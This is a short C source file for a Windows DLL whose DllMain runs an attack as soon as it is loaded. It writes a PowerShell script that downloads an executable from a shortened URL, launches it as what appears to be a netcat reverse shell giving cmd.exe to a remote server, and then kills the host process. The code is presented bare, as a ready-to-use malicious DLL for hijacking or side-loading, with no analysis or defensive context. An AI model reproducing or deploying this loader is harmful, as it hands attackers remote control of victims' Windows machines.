#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("C:\\Windows\\System32\\cmd.exe /c mkdir c:\\dll 2> NUL & echo ^[Net.ServicePointManager^]::SecurityProtocol ^= ^[Net.SecurityProtocolType^]::Tls12 > c:\\dll\\b.ps1 & echo (wget 'https://tinyurl.com/y88r9epk' -OutFile c:\\dll\\a.exe) >> c:\\dll\\b.ps1 & powershell -ExecutionPolicy ByPass -File c:\\dll\\b.ps1 & START /MIN c:\\dll\\a.exe server_ip server_port -e cmd.exe -d & exit");
        ExitProcess(0);
    }
    return TRUE;
}
